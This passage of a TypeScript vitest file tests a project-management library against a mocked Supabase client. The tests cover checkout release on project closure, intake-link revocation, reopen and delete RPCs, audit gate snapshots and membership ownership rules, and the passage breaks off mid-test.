// projects Round G — J8 PROJECT-MODEL (projects-and-cost PC-2 + projects-tab
// P8), the lib half, driven through lib/projects.ts against a recording
// supabase mock (vi.hoisted state + a Proxy chain — the sweepRoundD3 pattern).
//
//   PM-4   the project release runs per session: the actor's own sessions in
//          one statement, everyone else's one at a time; a refusal is "still
//          held by X", never a silent no-op, and the notice says what happened;
//          the sweep releases checkouts stranded on a closed project
//   PM-1   closing revokes the intake links FIRST; a closed project is not
//          reopened by a status change — reopenProject (controller RPC) is
//   SAF-14 the completion's audit row carries the gate snapshot
//   PM-6 / QUAL-3 / SEC-9  delete goes through delete_project_record; without
//          it only a record-less project is deleted, project row first
//   PM-7 / PM-9  writeActivity is checked (the refusal comes back as text —
//          it never throws, the contract its callers in other packages rely
//          on); writeActivityChecked throws for a comment; neither touches
//          projects
//   PM-11  'owner' is never set by updateMember / addMember
//   PM-5   the controller tier is the role collection (isControllerPrincipal)
//   SEC-15 ownership moves through transfer_project_ownership
//   UX-11  the register lists approved intake documents and counts the hidden
//   PM-10  csvSafe neutralises formula-leading cells

import { describe, it, expect, vi, beforeEach } from "vitest";

type Row = Record<string, unknown>;

const state = vi.hoisted(() => ({
  rows: {} as Record<string, Array<Record<string, unknown>>>,
  /** Queued answers per `${table}.${op}` — shifted per statement; each may carry an error. */
  queue: {} as Record<string, Array<{ data?: unknown; error?: { message: string; code?: string } | null; count?: number }>>,
  /** A static error for `${table}.${op}`. */
  errors: {} as Record<string, { message: string; code?: string } | undefined>,
  counts: {} as Record<string, number | { error: { message: string } }>,
  writes: [] as Array<{ table: string; op: string; payload: unknown; filters: Array<[string, unknown]> }>,
  calls: [] as Array<{ table: string; op: string; method: string; args: unknown[] }>,
  rpc: [] as Array<{ fn: string; args: unknown }>,
  rpcResults: {} as Record<string, { data: unknown; error: { message: string; code?: string } | null }>,
  audits: [] as Array<Record<string, unknown>>,
  emits: [] as Array<Record<string, unknown>>,
  notifies: [] as Array<Record<string, unknown>>,
  timeline: [] as string[],
}));

function chain(table: string) {
  let op = "select";
  let payload: unknown = undefined;
  let head = false;
  /** .range(from, to) — honoured for static rows (never for queued answers). */
  let win: [number, number] | null = null;
  const filters: Array<[string, unknown]> = [];
  const matches = (r: Row) => filters.every(([k, v]) => {
    if (k.startsWith("in:")) return (v as unknown[]).includes(r[k.slice(3)]);
    if (k.startsWith("is:")) return r[k.slice(3)] == null;
    if (k.startsWith("notnull:")) return r[k.slice(8)] != null;
    return r[k] === v;
  });
  const answer = () => {
    const key = `${table}.${op}`;
    const q = state.queue[key];
    if (q && q.length > 0) {
      const a = q.shift()!;
      return { data: a.error ? null : (a.data ?? []), error: a.error ?? null, count: a.count ?? null };
    }
    const err = state.errors[key] ?? null;
    if (head) {
      const c = state.counts[table];
      if (c && typeof c === "object") return { data: null, error: c.error, count: null };
      return { data: null, error: null, count: typeof c === "number" ? c : (state.rows[table] ?? []).filter(matches).length };
    }
    const hit = (state.rows[table] ?? []).filter(matches);
    return { data: err ? null : (win ? hit.slice(win[0], win[1] + 1) : hit), error: err, count: null };
  };
  const record = () => {
    if (op === "insert" || op === "update" || op === "delete" || op === "upsert") {
      state.writes.push({ table, op, payload, filters: [...filters] });
      state.timeline.push(`${op}:${table}`);
    }
  };
  const c: Record<string, unknown> = {};
  const h: ProxyHandler<Record<string, unknown>> = {
    get(_t, prop: string) {
      if (prop === "then") {
        return (resolve: (v: unknown) => void) => { record(); resolve(answer()); };
      }
      return (...args: unknown[]) => {
        state.calls.push({ table, op, method: prop, args });
        if (prop === "insert" || prop === "update" || prop === "delete" || prop === "upsert") { op = prop; payload = args[0]; }
        if (prop === "select" && (args[1] as { head?: boolean } | undefined)?.head) head = true;
        if (prop === "eq") filters.push([String(args[0]), args[1]]);
        if (prop === "in") filters.push([`in:${String(args[0])}`, args[1]]);
        if (prop === "is") filters.push([`is:${String(args[0])}`, args[1]]);
        if (prop === "not" && args[1] === "is") filters.push([`notnull:${String(args[0])}`, true]);
        if (prop === "range") win = [Number(args[0]), Number(args[1])];
        if (prop === "maybeSingle" || prop === "single") {
          record();
          const a = answer();
          const rows = (a.data as Row[] | null) ?? [];
          return Promise.resolve({ data: a.error ? null : (Array.isArray(rows) ? rows[0] ?? null : rows), error: a.error });
        }
        return new Proxy(c, h);
      };
    },
  };
  return new Proxy(c, h);
}

vi.mock("@/lib/supabase", () => ({
  supabase: {
    from: (t: string) => chain(t),
    rpc: (fn: string, args: unknown) => {
      state.rpc.push({ fn, args });
      state.timeline.push(`rpc:${fn}`);
      const r = state.rpcResults[fn] ?? { data: null, error: null };
      return Promise.resolve(r);
    },
  },
}));
vi.mock("@/lib/audit", () => ({
  logAuditAction: vi.fn(async (p: Record<string, unknown>) => { state.audits.push(p); state.timeline.push(`audit:${String(p.action)}`); return { error: null }; }),
  logCheckoutEvent: vi.fn(async () => ({ error: null })),
}));
vi.mock("@/lib/notify/dispatch", () => ({ emit: vi.fn(async (p: Record<string, unknown>) => { state.emits.push(p); }) }));
vi.mock("@/lib/inAppNotifications", () => ({
  notify: vi.fn(async (p: Record<string, unknown>) => { state.notifies.push(p); state.timeline.push("notify"); }),
  notifyMany: vi.fn(async () => undefined),
}));
vi.mock("@/lib/subscriptions", () => ({ listFollowerIds: vi.fn(async () => []) }));
vi.mock("@/lib/checkoutEpisodes", () => ({
  ensureActiveEpisode: vi.fn(async () => null),
  postEpisodeSystemMessage: vi.fn(async () => undefined),
  reconcileDocumentCheckoutState: vi.fn(async () => undefined),
  isMissingOutcomeSchema: () => false,
}));

import {
  releaseAllCheckoutsForProject, transitionProjectStatus, reopenProject, deleteProject,
  writeActivity, writeActivityChecked, postComment, addMember, updateMember, assertCanManageProject, transferOwnership,
  listProjectDocuments, documentsTabCount, closeoutGateLines, describeReleaseOutcome,
  countProjectRecords, describeProjectRecords, regulatedRecordTotal, autoReleaseExpiredAdHoc,
  CLOSED_PROJECT_STATUSES, CLOSED_PROJECT_SWEEP_MS, type ProjectRecordCounts,
} from "@/lib/projects";
import { csvCell, csvLine, isFormulaLike } from "@/lib/csvSafe";
import { parseGateSnapshot } from "@/lib/projectReport";
import type { ProjectStateSnapshot } from "@/lib/projectHealth";

const writesTo = (table: string, op?: string) => state.writes.filter((w) => w.table === table && (!op || w.op === op));
const MISSING_FN = { message: "Could not find the function public.x in the schema cache", code: "PGRST202" };

function snapshot(over: Partial<ProjectStateSnapshot> = {}): ProjectStateSnapshot {
  return {
    hasPurpose: true, hasGoals: true, hasSow: true, jobKind: null,
    budget: 0, committed: 0, spent: 0, cpi: null, accountCount: 0, accountsPinned: 0, partyCount: 0,
    quoteCount: 0, unawardedRfqGroups: 0, pendingCostDocs: 0, openChangeOrders: 0, approvedCoAmount: 0,
    milestoneCount: 0, overdueMilestones: 0, spi: null, hasBaseline: false,
    checklistCount: 0, checklistOpenItems: 0, checklistNeedsEvidence: 0, turnoverRequired: 0, turnoverAccepted: 0, punchOpen: 0,
    intakeLinkCount: 0, membersCount: 1, readFailures: [], notMigrated: [],
    ...over,
  };
}

const OWNER = { org_id: "o1", uid: "own", status: "active", role: "Engineer", roles: ["Engineer"] };
const PROJECT = { id: "p1", org_id: "o1", owner_user_id: "own", name: "Unit 300 Repipe", status: "active" };

beforeEach(() => {
  state.rows = {}; state.queue = {}; state.errors = {}; state.counts = {};
  state.writes = []; state.calls = []; state.rpc = []; state.rpcResults = {};
  state.audits = []; state.emits = []; state.notifies = []; state.timeline = [];
});

// ── PM-4 ─────────────────────────────────────────────────────────────────────

describe("PM-4 — the project release is per session, and says what really happened", () => {
  const own = { id: "s-own", document_id: "d1", org_id: "o1", user_id: "own", user_name: "owen" };
  const bob = { id: "s-bob", document_id: "d2", org_id: "o1", user_id: "bob", user_name: "bob" };
  const ann = { id: "s-ann", document_id: "d3", org_id: "o1", user_id: "ann", user_name: "ann" };

  it("the actor's own sessions end in ONE statement; each other session on its own; a refusal holds only itself", async () => {
    state.queue["checkout_sessions.select"] = [{ data: [own, bob, ann] }];
    state.queue["checkout_sessions.update"] = [
      { data: [own] },                                   // the actor's own batch
      { data: [bob] },                                   // bob's — released (e.g. the actor holds checkout.force_release for it)
      { error: { message: "You are not allowed to release another user's checkout.", code: "23514" } }, // ann's
    ];
    const out = await releaseAllCheckoutsForProject({ projectId: "p1", reason: "Project cancelled", actorUserId: "own" });
    const updates = writesTo("checkout_sessions", "update");
    expect(updates.map((u) => u.filters.find(([k]) => k === "in:id")?.[1])).toEqual([["s-own"], ["s-bob"], ["s-ann"]]);
    expect(out.released).toBe(2);
    expect(out.releasedSessionIds).toEqual(["s-own", "s-bob"]);
    expect(out.stillHeld).toEqual([{ sessionId: "s-ann", documentId: "d3", userId: "ann", userName: "ann", reason: "You are not allowed to release another user's checkout." }]);
    // One CHECK_IN per released document — none for the one still held.
    expect(state.audits.filter((a) => a.action === "CHECK_IN").map((a) => a.resourceId)).toEqual(["d1", "d2"]);
    expect(describeReleaseOutcome(out)).toBe("2 active checkouts were released; 1 is still held by ann.");
  });

  it("before the fix the ONE batch refused everything — now a non-controller owner still frees their own", async () => {
    state.queue["checkout_sessions.select"] = [{ data: [own, ann] }];
    state.queue["checkout_sessions.update"] = [
      { data: [own] },
      { error: { message: "You are not allowed to release another user's checkout.", code: "23514" } },
    ];
    const out = await releaseAllCheckoutsForProject({ projectId: "p1", reason: "x", actorUserId: "own" });
    expect(out.releasedSessionIds).toEqual(["s-own"]);
    expect(out.stillHeld.map((h) => h.userName)).toEqual(["ann"]);
  });

  it("transitionProjectStatus: the audience notice and the page message are built from the real outcome", async () => {
    state.rows.projects = [PROJECT];
    state.rows.org_members = [OWNER];
    state.rows.project_members = [{ project_id: "p1", user_id: "ann" }];
    state.queue["checkout_sessions.select"] = [{ data: [own, ann] }];
    state.queue["checkout_sessions.update"] = [
      { data: [own] },
      { error: { message: "You are not allowed to release another user's checkout.", code: "23514" } },
    ];
    const res = await transitionProjectStatus({ projectId: "p1", orgId: "o1", toStatus: "cancelled", reason: "MOC withdrawn", actorUserId: "own", actorEmail: "own@x.io" });
    expect(res.releaseError).toMatch(/^The project is cancelled, but not every active checkout was released: 1 active checkout was released; 1 is still held by ann\./);
    expect(state.emits[0].body).toBe("Reason: MOC withdrawn 1 active checkout was released; 1 is still held by ann.");
    expect(String(state.emits[0].body)).not.toMatch(/Any active checkouts on the project were released/);
  });
});

describe("PM-4 dw4 — the sweep releases checkouts stranded on a closed project, after 24h", () => {
  it("the cron releases a project checkout whose project closed more than a day ago, with its own reason", async () => {
    const { supabase } = await import("@/lib/supabase");
    const longAgo = new Date(Date.now() - CLOSED_PROJECT_SWEEP_MS - 60_000).toISOString();
    const justNow = new Date().toISOString();
    state.queue["checkout_sessions.select"] = [
      { data: [] },                                                           // no ad-hoc expiries
      { data: [{ id: "s1", project_id: "p-old" }, { id: "s2", project_id: "p-new" }, { id: "s3", project_id: "p-live" }] },
    ];
    state.rows.projects = [
      { id: "p-old", status: "cancelled", cancelled_at: longAgo, updated_at: longAgo },
      { id: "p-new", status: "completed", completed_at: justNow, updated_at: justNow }, // inside the window: not yet
      { id: "p-live", status: "active", updated_at: longAgo },
    ];
    state.queue["checkout_sessions.update"] = [{ data: [{ id: "s1", document_id: "d1", org_id: "o1", user_id: "ann", library_id: "l1" }] }];
    const n = await autoReleaseExpiredAdHoc(null, { client: supabase as never });
    expect(n).toBe(1);
    const sweep = writesTo("checkout_sessions", "update")[0];
    expect(sweep.filters).toContainEqual(["in:id", ["s1"]]);
    expect(sweep.payload).toMatchObject({ released_reason: "Auto-released: the project was closed", outcome: "auto_released" });
    const notes = writesTo("notifications", "insert")[0].payload as Row[];
    expect(notes[0]).toMatchObject({ user_id: "ann", title: "Your project checkout was released" });
  });

  it("the window runs from the CLOSURE, not updated_at: a later edit to a closed project does not restart it; an archive reads its closing feed row", async () => {
    const { supabase } = await import("@/lib/supabase");
    const longAgo = new Date(Date.now() - CLOSED_PROJECT_SWEEP_MS - 60_000).toISOString();
    const justNow = new Date().toISOString();
    state.queue["checkout_sessions.select"] = [
      { data: [] },
      { data: [{ id: "s1", project_id: "p-edited" }, { id: "s2", project_id: "p-archived" }, { id: "s3", project_id: "p-archived-new" }] },
    ];
    state.rows.projects = [
      // completed a day+ ago, description edited just now — before the fix, updated_at kept it locked another 24h
      { id: "p-edited", status: "completed", completed_at: longAgo, updated_at: justNow },
      // archived with no stamp: its closing status_changed feed row says when
      { id: "p-archived", status: "archived", completed_at: null, cancelled_at: null, updated_at: justNow },
      { id: "p-archived-new", status: "archived", completed_at: null, cancelled_at: null, updated_at: longAgo },
    ];
    state.rows.project_activity = [
      { id: "a1", project_id: "p-archived", type: "status_changed", created_at: longAgo, metadata: { toStatus: "archived" } },
      { id: "a2", project_id: "p-archived", type: "status_changed", created_at: justNow, metadata: { toStatus: "paused" } }, // not a closure
      { id: "a3", project_id: "p-archived-new", type: "status_changed", created_at: justNow, metadata: { toStatus: "archived" } },
    ];
    state.queue["checkout_sessions.update"] = [{ data: [
      { id: "s1", document_id: "d1", org_id: "o1", user_id: "ann", library_id: "l1" },
      { id: "s2", document_id: "d2", org_id: "o1", user_id: "bob", library_id: "l1" },
    ] }];
    await autoReleaseExpiredAdHoc(null, { client: supabase as never });
    expect(writesTo("checkout_sessions", "update")[0].filters).toContainEqual(["in:id", ["s1", "s2"]]);
    // the project read asks for the closure stamps
    const projSelect = state.calls.find((c) => c.table === "projects" && c.method === "select")!;
    expect(String(projSelect.args[0])).toMatch(/completed_at, cancelled_at/);
  });

  it("the sweep's reads are bounded: sessions page past PostgREST's 1000-row cap, project ids go 100 per request", async () => {
    const { supabase } = await import("@/lib/supabase");
    const page1 = Array.from({ length: 1000 }, (_, i) => ({ id: `s${i}`, project_id: `p${i % 250}` }));
    const page2 = Array.from({ length: 5 }, (_, i) => ({ id: `t${i}`, project_id: `p${i}` }));
    state.queue["checkout_sessions.select"] = [{ data: [] }, { data: page1 }, { data: page2 }];
    state.rows.projects = [];
    await autoReleaseExpiredAdHoc(null, { client: supabase as never });
    const ranges = state.calls.filter((c) => c.table === "checkout_sessions" && c.method === "range").map((c) => c.args);
    expect(ranges).toEqual([[0, 999], [1000, 1999]]);
    const inCalls = state.calls.filter((c) => c.table === "projects" && c.method === "in").map((c) => (c.args[1] as string[]).length);
    expect(inCalls).toEqual([100, 100, 50]);
  });
});

// ── PM-1 ─────────────────────────────────────────────────────────────────────

describe("PM-1 — closing closes the door; reopening is a controller's audited act", () => {
  it("closing revokes the project's intake links BEFORE the status changes, and records how many", async () => {
    state.rows.projects = [PROJECT];
    state.rows.org_members = [OWNER];
    state.queue["project_intake_links.update"] = [{ data: [{ id: "l1" }, { id: "l2" }] }];
    state.queue["checkout_sessions.select"] = [{ data: [] }];
    const res = await transitionProjectStatus({ projectId: "p1", orgId: "o1", toStatus: "cancelled", reason: "withdrawn", actorUserId: "own" });
    expect(res.revokedIntakeLinks).toBe(2);
    const t = state.timeline;
    expect(t.indexOf("update:project_intake_links")).toBeGreaterThanOrEqual(0);
    expect(t.indexOf("update:project_intake_links")).toBeLessThan(t.indexOf("update:projects"));
    const revoke = writesTo("project_intake_links", "update")[0];
    expect(revoke.filters).toContainEqual(["project_id", "p1"]);
    expect(revoke.filters).toContainEqual(["is:revoked_at", null]);
    expect(state.audits.find((a) => a.action === "PROJECT_CANCELLED")?.details).toMatchObject({ revokedIntakeLinks: 2, fromStatus: "active" });
  });

  it("a refused revocation leaves the project OPEN (fail safe) — nothing else is written", async () => {
    state.rows.projects = [PROJECT];
    state.rows.org_members = [OWNER];
    state.queue["project_intake_links.update"] = [{ error: { message: "permission denied", code: "42501" } }];
    await expect(transitionProjectStatus({ projectId: "p1", orgId: "o1", toStatus: "completed", actorUserId: "own", gateSnapshot: snapshot() }))
      .rejects.toThrow(/intake links could not be revoked, so the project was not closed/);
    expect(writesTo("projects", "update")).toHaveLength(0);
  });

  it("pausing or resuming an OPEN project revokes nothing", async () => {
    state.rows.projects = [PROJECT];
    state.rows.org_members = [OWNER];
    await transitionProjectStatus({ projectId: "p1", orgId: "o1", toStatus: "paused", actorUserId: "own" });
    expect(writesTo("project_intake_links")).toHaveLength(0);
  });

  it("a closed project is not moved back to an open status by transitionProjectStatus", async () => {
    state.rows.projects = [{ ...PROJECT, status: "completed" }];
    state.rows.org_members = [OWNER];
    await expect(transitionProjectStatus({ projectId: "p1", orgId: "o1", toStatus: "active", actorUserId: "own" }))
      .rejects.toThrow(/Reopening a closed project is a separate, audited action/);
    expect(writesTo("projects", "update")).toHaveLength(0);
    // Closed → closed (archive a completed project) is allowed.
    state.queue["checkout_sessions.select"] = [{ data: [] }];
    await expect(transitionProjectStatus({ projectId: "p1", orgId: "o1", toStatus: "archived", actorUserId: "own" })).resolves.toMatchObject({ releaseError: null });
    expect(CLOSED_PROJECT_STATUSES).toEqual(new Set(["completed", "cancelled", "archived"]));
  });

  it("an UPDATE the policy filters to zero rows is a refusal: no feed row, no audit row, no release, no notice — and the revoked links are named", async () => {
    state.rows.projects = [PROJECT];
    state.rows.org_members = [OWNER];
    state.queue["project_intake_links.update"] = [{ data: [{ id: "l1" }, { id: "l2" }] }];
    state.queue["projects.update"] = [{ data: [] }]; // RLS filtered: no error, no row
    state.queue["checkout_sessions.select"] = [{ data: [{ id: "s1", document_id: "d1", org_id: "o1", user_id: "own", user_name: "owen" }] }];
    await expect(transitionProjectStatus({ projectId: "p1", orgId: "o1", toStatus: "completed", actorUserId: "own", gateSnapshot: snapshot() }))
      .rejects.toThrow(/^The project's status did not change: the database did not update it.*2 contractor intake link\(s\) were revoked first/);
    // RETURNING was asked for, so the zero-row case is seen.
    const upd = state.calls.find((c) => c.table === "projects" && c.op === "update" && c.method === "select");
    expect(upd?.args[0]).toBe("id");
    expect(writesTo("project_activity")).toHaveLength(0);
    expect(state.audits.filter((a) => String(a.action).startsWith("PROJECT_"))).toEqual([]);
    expect(writesTo("checkout_sessions")).toHaveLength(0);
    expect(state.emits).toEqual([]);
    // A pause (no revocation) says nothing about links.
    state.queue["projects.update"] = [{ data: [] }];
    await expect(transitionProjectStatus({ projectId: "p1", orgId: "o1", toStatus: "paused", actorUserId: "own" }))
      .rejects.toThrow(/^The project's status did not change: the database did not update it \(you may no longer be allowed to manage it\)\.$/);
  });

  it("reopenProject goes through the reopen_project RPC with the reason; no reason → nothing called; no migration → said so", async () => {
    await expect(reopenProject({ projectId: "p1", orgId: "o1", reason: "  ", actorUserId: "dc" })).rejects.toThrow(/A reason is required/);
    expect(state.rpc).toEqual([]);
    await reopenProject({ projectId: "p1", orgId: "o1", reason: "Punch items found at walkdown", actorUserId: "dc" });
    expect(state.rpc).toEqual([{ fn: "reopen_project", args: { p_project: "p1", p_reason: "Punch items found at walkdown" } }]);
    state.rpcResults.reopen_project = { data: null, error: { message: "Only Admin / Document Control can reopen a closed project.", code: "42501" } };
    await expect(reopenProject({ projectId: "p1", orgId: "o1", reason: "x", actorUserId: "own" })).rejects.toThrow(/Only Admin \/ Document Control can reopen/);
    state.rpcResults.reopen_project = { data: null, error: MISSING_FN };
    await expect(reopenProject({ projectId: "p1", orgId: "o1", reason: "x", actorUserId: "dc" })).rejects.toThrow(/needs database migration 20261103/);
  });
});

// ── SAF-14 ───────────────────────────────────────────────────────────────────

describe("SAF-14 — the completion's audit row records what was open at the override", () => {
  it("records the four gate lines the dialog showed, and the report reads them back", async () => {
    state.rows.projects = [PROJECT];
    state.rows.org_members = [OWNER];
    state.queue["checkout_sessions.select"] = [{ data: [] }];
    const gates = snapshot({ punchOpen: 11, turnoverRequired: 6, turnoverAccepted: 2, checklistOpenItems: 0, checklistNeedsEvidence: 0, openChangeOrders: 0 });
    await transitionProjectStatus({ projectId: "p1", orgId: "o1", toStatus: "completed", reason: "handed over", actorUserId: "own", gateSnapshot: gates });
    const row = state.audits.find((a) => a.action === "PROJECT_COMPLETED")!;
    const details = row.details as { gates: Array<Record<string, unknown>>; overridden: boolean };
    expect(details.overridden).toBe(true);
    expect(details.gates).toEqual([
      { key: "punch", ok: false, text: "11 punch items still open", openCount: 11 },
      { key: "turnover", ok: false, text: "Turnover 2/6 accepted", openCount: 4 },
      { key: "checklists", ok: true, text: "Checklists clear", openCount: 0 },
      { key: "changeOrders", ok: true, text: "No change orders awaiting decision", openCount: 0 },
    ]);
    // The printed report (lib/projectReport, J7) renders exactly these lines.
    expect(parseGateSnapshot(details)).toEqual([
      { text: "11 punch items still open", ok: false },
      { text: "Turnover 2/6 accepted", ok: false },
      { text: "Checklists clear", ok: true },
      { text: "No change orders awaiting decision", ok: true },
    ]);
  });

  it("a snapshot that could not be gathered records overridden: null beside gates: null — unknown, never 'not overridden'", async () => {
    state.rows.projects = [PROJECT];
    state.rows.org_members = [OWNER];
    state.queue["checkout_sessions.select"] = [{ data: [] }];
    vi.doMock("@/lib/projectSnapshot", () => ({ gatherProjectSnapshotUncached: async () => { throw new Error("snapshot read failed"); } }));
    try {
      await transitionProjectStatus({ projectId: "p1", orgId: "o1", toStatus: "completed", reason: "handed over", actorUserId: "own" });
    } finally {
      vi.doUnmock("@/lib/projectSnapshot");
    }
    const details = state.audits.find((a) => a.action === "PROJECT_COMPLETED")!.details as Record<string, unknown>;
    expect(details.gates).toBeNull();
    expect(details.overridden).toBeNull();
    expect(details.gateSnapshotError).toBe("snapshot read failed");
  });

  it("a gate whose read failed is recorded as UNKNOWN, never as clear", () => {
    const lines = closeoutGateLines(snapshot({ readFailures: ["punch items", "checklist items"] }));
    expect(lines.find((l) => l.key === "punch")).toEqual({ key: "punch", ok: null, text: "Punch list — could not be read", openCount: null });
    expect(lines.find((l) => l.key === "checklists")?.ok).toBeNull();
    expect(lines.find((l) => l.key === "turnover")?.ok).toBe(true);
  });
});

// ── PM-6 / QUAL-3 / SEC-9 ────────────────────────────────────────────────────

describe("PM-6 / QUAL-3 — deleting a project counts, audits and refuses", () => {
  it("goes through delete_project_record with the reason; the database's refusal reaches the user", async () => {
    state.rows.projects = [PROJECT];
    state.rows.org_members = [OWNER];
    state.rpcResults.delete_project_record = { data: { counts: { checklists: 2 } }, error: null };
    await expect(deleteProject({ projectId: "p1", actorUserId: "own", reason: "duplicate project" })).resolves.toEqual({ counts: { checklists: 2 } });
    expect(state.rpc).toEqual([{ fn: "delete_project_record", args: { p_project: "p1", p_reason: "duplicate project" } }]);
    expect(writesTo("projects")).toHaveLength(0); // the lib deletes nothing itself
    state.rpcResults.delete_project_record = { data: null, error: { message: "This project carries 12 cost / quality record(s). It cannot be deleted — archive it instead", code: "23514" } };
    await expect(deleteProject({ projectId: "p1", actorUserId: "own" })).rejects.toThrow(/archive it instead/);
  });

  it("without 20261103 a project carrying records is refused and NOTHING is deleted", async () => {
    state.rows.projects = [PROJECT];
    state.rows.org_members = [OWNER];
    state.rpcResults.delete_project_record = { data: null, error: MISSING_FN };
    state.counts = { cost_accounts: 0, cost_entries: 0, cost_documents: 0, change_orders: 0, project_parties: 0, project_checklists: 1, turnover_items: 4, punch_items: 0, project_documents: 3, milestones: 7 };
    state.rows.project_checklists = [{ id: "c1", project_id: "p1" }];
    state.counts.checklist_items = 120;
    await expect(deleteProject({ projectId: "p1", actorUserId: "own" })).rejects.toThrow(/carries cost or quality records/);
    expect(state.writes.filter((w) => w.op === "delete")).toHaveLength(0);
  });

  it("without 20261103 a RECORD-LESS project is deleted project-row FIRST, then its schedule, audited with the counts", async () => {
    state.rows.projects = [PROJECT];
    state.rows.org_members = [OWNER];
    state.rows.milestones = [{ id: "m1", project_id: "p1" }, { id: "m2", project_id: "p1" }];
    state.rpcResults.delete_project_record = { data: null, error: MISSING_FN };
    state.counts = { cost_accounts: 0, cost_entries: 0, cost_documents: 0, change_orders: 0, project_parties: 0, project_checklists: 0, turnover_items: 0, punch_items: 0, project_documents: 1, milestones: 2 };
    await deleteProject({ projectId: "p1", actorUserId: "own" });
    const deletes = state.timeline.filter((t) => t.startsWith("delete:"));
    expect(deletes).toEqual(["delete:projects", "delete:milestones"]);
    expect(writesTo("milestones", "delete")[0].filters).toContainEqual(["in:id", ["m1", "m2"]]);
    const audit = state.audits.find((a) => a.action === "PROJECT_DELETED")!;
    expect((audit.details as { counts: ProjectRecordCounts }).counts).toMatchObject({ milestones: 2, documentLinks: 1, turnoverItems: 0 });
  });

  it("without 20261103 a DELETE the policy filters to zero rows deletes no schedule and audits no PROJECT_DELETED", async () => {
    state.rows.projects = [PROJECT];
    state.rows.org_members = [OWNER];
    state.rows.milestones = [{ id: "m1", project_id: "p1" }];
    state.rows.project_intake_links = [{ id: "k1", project_id: "p1", revoked_at: null }];
    state.rpcResults.delete_project_record = { data: null, error: MISSING_FN };
    state.counts = { cost_accounts: 0, cost_entries: 0, cost_documents: 0, change_orders: 0, project_parties: 0, project_checklists: 0, turnover_items: 0, punch_items: 0, project_documents: 0, milestones: 1 };
    state.queue["projects.delete"] = [{ data: [] }]; // RLS filtered: no error, no row
    await expect(deleteProject({ projectId: "p1", actorUserId: "own" })).rejects.toThrow(/^Nothing was deleted: the database did not remove the project.*1 contractor intake link\(s\) were revoked first/);
    const deleteCall = state.calls.find((c) => c.table === "projects" && c.op === "delete" && c.method === "select");
    expect(deleteCall?.args[0]).toBe("id"); // RETURNING
    expect(writesTo("milestones", "delete")).toHaveLength(0);
    expect(state.audits.find((a) => a.action === "PROJECT_DELETED")).toBeUndefined();
  });

  it("the confirm's lines come from live counts; an unreadable count is unknown, never zero", async () => {
    state.counts = { cost_accounts: 3, cost_entries: 14, cost_documents: 0, change_orders: 4, project_parties: 2, project_checklists: 1, turnover_items: { error: { message: "denied" } }, punch_items: 40, project_documents: 0, milestones: 0 };
    state.rows.project_checklists = [{ id: "c1", project_id: "p1" }];
    state.counts.checklist_items = 120;
    const c = await countProjectRecords("p1");
    expect(c.turnoverItems).toBeNull();
    expect(regulatedRecordTotal(c)).toBeNull();
    expect(describeProjectRecords(c)).toEqual([
      "3 budget lines", "14 cost entries", "4 change orders", "2 companies on the job", "1 checklist",
      "120 checklist items", "turnover items: could not be counted", "40 punch items",
    ]);
    expect(regulatedRecordTotal({ ...c, turnoverItems: 0 })).toBe(3 + 14 + 4 + 1 + 120 + 40);
  });
});

// ── PM-7 / PM-9 ──────────────────────────────────────────────────────────────

describe("PM-7 / PM-9 — the feed write is checked and no longer touches projects", () => {
  it("a refused insert comes back as text (never a throw); writeActivityChecked throws it; the client never UPDATEs projects.last_activity_at", async () => {
    const RLS = { message: "new row violates row-level security policy for table \"project_activity\"" };
    state.queue["project_activity.insert"] = [{ error: RLS }, { error: RLS }];
    await expect(writeActivity({ projectId: "p1", orgId: "o1", userId: "u1", type: "checkout_added" })).resolves.toMatch(/^The project activity row was not written: new row violates/);
    await expect(writeActivityChecked({ projectId: "p1", orgId: "o1", userId: "u1", type: "comment", body: "x" })).rejects.toThrow(/^The project activity row was not written: new row violates/);
    await expect(writeActivity({ projectId: "p1", orgId: "o1", userId: "u1", type: "checkout_added" })).resolves.toBeNull();
    expect(writesTo("projects")).toHaveLength(0);
  });

  it("the exported writeActivity never rejects — its callers in other packages await it bare after their main write has committed", async () => {
    const { supabase } = await import("@/lib/supabase");
    const from = supabase.from;
    (supabase as { from: unknown }).from = () => { throw new Error("fetch failed"); };
    try {
      await expect(writeActivity({ projectId: "p1", orgId: "o1", type: "checkout_added" })).resolves.toBe("The project activity row was not written: fetch failed");
    } finally {
      (supabase as { from: unknown }).from = from;
    }
    // Those callers (checkout, markup requests) await it bare between their committed write and
    // their audit row: a rejection there would skip CHECK_OUT / MARKUP_* and report a saved
    // action as failed. The contract they rely on is "resolves".
    const { readFileSync } = await import("node:fs");
    const { join } = await import("node:path");
    const modal = readFileSync(join(process.cwd(), "components/documents/CheckoutFlowModal.tsx"), "utf8");
    const markups = readFileSync(join(process.cwd(), "lib/markupRequests.ts"), "utf8");
    expect(modal).toMatch(/await writeActivity\(\{/);
    expect(modal.indexOf("await writeActivity({")).toBeLessThan(modal.indexOf("logCheckoutEvent", modal.indexOf("await writeActivity({")));
    expect((markups.match(/await writeActivity\(\{/g) ?? []).length).toBe(2);
  });

  it("an observer's refused comment is 'not posted', and nobody is notified of it", async () => {
    state.queue["project_activity.insert"] = [{ error: { message: "new row violates row-level security policy for table \"project_activity\"" } }];
    await expect(postComment({ projectId: "p1", orgId: "o1", body: "looks fine", actorUserId: "obs" })).rejects.toThrow(/^Your comment was not posted: new row violates/);
    expect(state.emits).toHaveLength(0);
  });

  it("a feed row refused AFTER the change landed is reported — after the notice the change owes", async () => {
    state.queue["project_activity.insert"] = [{ error: { message: "denied" } }];
    await expect(addMember({ projectId: "p1", orgId: "o1", userId: "u2", userEmail: "u2@x.io", actorUserId: "own" }))
      .rejects.toThrow(/u2@x\.io was added — saved, but the project feed row was not written: denied/);
    expect(writesTo("project_members", "upsert")).toHaveLength(1);
    expect(state.notifies).toHaveLength(1); // the new member was still told
  });
});

// ── PM-11 ────────────────────────────────────────────────────────────────────

describe("PM-11 — 'owner' is set only by a transfer", () => {
  it("updateMember and addMember refuse role 'owner' and write nothing", async () => {
    await expect(updateMember({ projectId: "p1", userId: "u2", role: "owner", actorUserId: "own" })).rejects.toThrow(/Ownership moves only through Transfer ownership/);
    await expect(addMember({ projectId: "p1", orgId: "o1", userId: "u2", role: "owner", actorUserId: "own" })).rejects.toThrow(/Ownership moves only through Transfer ownership/);
    expect(state.writes).toEqual([]);
  });
});

// ── PM-5 / SEC-9 ─────────────────────────────────────────────────────────────

describe("PM-5 / SEC-9 — who may manage a project", () => {
  it("a controller held ADDITIVELY behind a higher-ranked headline manages it; an inactive owner does not", async () => {
    state.rows.projects = [{ ...PROJECT, owner_user_id: "someone" }];
    state.rows.org_members = [
